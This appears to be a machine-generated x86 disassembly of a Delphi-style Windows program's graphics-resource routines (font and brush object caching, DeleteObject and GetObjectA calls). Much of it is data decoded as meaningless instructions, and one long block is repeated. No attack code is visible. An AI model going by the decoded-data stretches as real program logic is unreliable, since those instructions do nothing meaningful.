add [ ebx + ebp + 0x42 ] bl
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ esi + ebp + 0x140042 ] bl
sub eax 0x100042
add bh bh
pushfd
push eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
mov [ eax + 0x42 ] ss
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
das
inc edx
add [ ecx + 0x41 ] cl
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] bl
add [ eax ] al
fsub [ eax + 0x41 ]
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
das
inc edx
imul esp [ ebx + 0x73 ] 0x27980002
inc edx
add [ ecx + ecx * 2 + 0x49a40042 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
add al 0xdc
jmp sub_4190c8
dec ebp
add bh bh
test al 0x50
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
imul esp [ ebx + 0x73 ] 0x2e9c0004
inc edx
add [ eax + eax ] dl
mov es [ ecx ]
enter 0x4252 0x0
mov ah 0x52
inc edx
add al ch
push ecx
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add [ eax - 0x4bffbe71 ] ah
sub al [ edx ]
mov eax 0xc000424a
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
dec esp
das
inc edx
sub_4228cc
add [ esp + edx * 2 ] ecx
inc esi
outsd
outsb
je r-xdata
jb r-xdata
push 0x65737261
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
je r-xdata
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
call 0x3426b11
or dl [ esi + eax * 2 + 0x6f ]
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
sub [ edx ] al
mov eax eax
push eax
sub [ edx ] eax
add ecx [ ecx ]
push esp
push eax
outsb
push ebx
je r-xdata
in al 0x28
inc edx
add [ ebx + 0x422950c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
sub [ edx ] al
push es
jae r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x2938c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ ecx + ebp + 0x42 ] cl
add [ edi ] al
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
outsd
insb
or [ fs : esi + 0x73 ] ah
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
pushad
sub eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub eax [ edx ]
dec esp
sub eax [ edx ]
sbb [ eax ] al
add [ eax ] al
fsub [ eax + 0x41 ]
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x4229b890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2b ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x42 ] al
jae r-xdata
shl [ edx + ebp + 0x42 ] 0x0
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
add eax 0x6f4e6d70
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
push es
jo r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x2a ] dh
inc edx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ ecx + ebp + 0x70070042 ] dh
insd
push eax
outsb
insb
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
inc esp
popad
jae r-xdata
add [ eax ] al
mov [ ebx ] ch
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
inc [ eax + 0x5004240 ]
push esp
inc esi
outsd
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
or al 0x2c
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sub al 0x42
add [ esp + ebp ] bh
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x2b ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x67ffbe72 ] cl
pop [ ecx ]
mov al [ 0xffffffffb400418f ]
mov es [ ecx ]
add [ eax ] eax
std
inc eax
add [ eax + 0x4035 ] ah
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax ] bl
add [ eax ] al
add al bl
pushad
inc edx
jpe r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
dec [ eax + 0x3d ]
inc edx
add [ edi ] cl
push esp
jo r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
inc edx
push 0x6c797453
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
je r-xdata
inc edi
jb r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
popad
jb r-xdata
sub al 0x42
add [ edi ] al
add eax 0x6e6f4654
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
sub al 0x42
add [ edx ] dh
sub al 0x42
cmp al 0x2c
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + edi + 0x2b ] si
inc edx
add [ ecx + 0x41 ] cl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc ecx
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
popad
imul esp [ ebx + 0x73 ] 0x422b3890
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
cmp [ ebx ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x2a74c08b
or [ eax + 0x6d ] esi
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
inc edi
jb r-xdata
cmp eax 0x540f0042
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
popad
inc edx
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
pop esp
inc esp
inc edx
add [ eax + 0x44 ] bh
je r-xdata
popad
sub al 0x42
add [ ebx + ebp + 0x42 ] bl
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax + eax ] ah
add [ eax ] al
in al dx
xor ch [ edx + eax * 2 ]
jo r-xdata
add [ ebx + ebp + 0x42 ] cl
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
outsd
popad
insb
dec esi
outsd
je r-xdata
nop
inc edi
enter 0x4247 0x0
rol [ edi + 0x42 ] 0x1
imul esp [ ebx + 0x73 ] 0x27980004
inc edx
add [ esi + eax * 2 + 0x46c40042 ] bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax + eax * 2 + 0xe0042 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
daa
inc edx
add [ eax ] bl
add [ eax ] al
mov eax 0xe8004228
imul esp [ ebx + 0x73 ] 0x28c80007
inc edx
add [ eax ] al
inc ebp
inc edx
add [ eax ] cl
inc ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
inc ebx
inc edx
add [ eax ] al
inc esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
je r-xdata
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x4228b874
add al ch
jo r-xdata
sub al [ edx ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
imul esp [ ebx + 0x73 ] 0xc08b0000
mov [ ebx ] gs
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
add [ eax ] al
jae r-xdata
pushfd
inc ebp
inc edx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
mov al [ 0x700422d ]
add al 0x54
push eax
outsb
mov [ 0x2b5c0042 ] ch
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x2e88c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422e ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp + 0x180042 ] dl
add [ eax ] al
in al dx
sub al [ edx ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + ecx * 2 ] bh
inc edx
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
dec eax
inc edx
add [ esi ] al
push esp
inc edx
jb r-xdata
sub [ edx ] eax
sbb [ eax ] al
add bh bh
test [ edi + 0x42 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x4c65646f ] al
sub [ edx ] eax
cwde
inc edi
inc edx
add [ eax + 0x1004247 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add al cl
inc edi
inc edx
add al dl
inc edi
inc edx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
cwde
inc esp
inc edx
add [ esp + eax * 2 + 0x10042 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ 0x6c797453 ] al
lea eax [ eax ]
mov [ 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x422d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp + 0x1c0042 ] dl
add [ eax ] al
in al dx
sub al [ edx ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ebp + eax * 2 + 0x42 ] dh
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
inc edx
add al dl
inc esp
inc edx
add al bl
inc esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + 0x40 ] bl
inc edx
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
pushfd
inc eax
inc edx
inc eax
add [ ebx + esi ] bl
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x67ffbdb5 ] bh
pop [ ecx ]
mov al [ 0xffffffffb400418f ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2f ] dh
nop
mov al [ 0x700422e ]
push es
push esp
inc edx
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x2000422b ] cl
jo r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0x42 ] ah
jae r-xdata
add al 0x24
retn
outsd
cmp [ gs : edx + eax * 2 ] ch
add [ eax + eax ] cl
add bh bh
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x46
das
inc edx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
jo r-xdata
mov [ esi ] ch
inc edx
add [ ebx + ebp + 0x42 ] bl
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ esi + ebp + 0x140042 ] bl
sub eax 0x100042
add bh bh
pushfd
push eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
mov [ eax + 0x42 ] ss
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
das
inc edx
add [ ecx + 0x41 ] cl
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] bl
add [ eax ] al
fsub [ eax + 0x41 ]
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
das
inc edx
imul esp [ ebx + 0x73 ] 0x27980002
inc edx
add [ ecx + ecx * 2 + 0x49a40042 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
add al 0xdc
jmp sub_4190c8
dec ebp
add bh bh
test al 0x50
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
imul esp [ ebx + 0x73 ] 0x2e9c0004
inc edx
add [ eax + eax ] dl
mov es [ ecx ]
enter 0x4252 0x0
mov ah 0x52
inc edx
add al ch
push ecx
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add [ eax - 0x4bffbe71 ] ah
sub al [ edx ]
mov eax 0xc000424a
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
dec esp
das
inc edx
sub_42345c
test al 0x34
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004234 ] ch
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esi + 0x54100042 ] cl
push edx
jae r-xdata
das
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_4234d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42350c
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_423548
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_4234bc
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_423530
xor edx edx
push ebp
push sub_42361c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423623
mov eax [ ebp - 0x4 ]
call sub_42353c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026ec
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_408110
test al al
je r-xdata
sub_42362c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_423530
xor ecx ecx
push ebp
push sub_4236b3
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42353c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_4236dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423530
xor eax eax
push ebp
push sub_423745
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_423548
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_42362c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42374c
mov eax [ ebp - 0x4 ]
call sub_42353c
retn
mov eax ebx
mov si 0xfffd
call sub_403564
sub_423754
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423530
xor eax eax
push ebp
push sub_4237b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4237b7
mov eax [ ebp - 0x4 ]
call sub_42353c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403564
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42362c
sub_4237c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423530
xor edx edx
push ebp
push sub_42381f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423826
mov eax [ ebp - 0x4 ]
call sub_42353c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_42382c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418c64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4238c9
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4188a0
mov ebx eax
mov eax ebx
call sub_424df8
inc [ ebp - 0x4 ]
mov eax ebx
call sub_42518c
mov eax [ rw-data ]
call sub_4237c0
mov eax [ rw-data ]
call sub_4237c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4238d0
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_418cc8
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4188a0
call sub_425064
inc esi
dec ebx
jne r-xdata
sub_423f1f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_4181c4
retn
sub_423f50
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402e24
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402c14
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_424004
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423548
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_424058
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_42362c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_42409c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418eb4
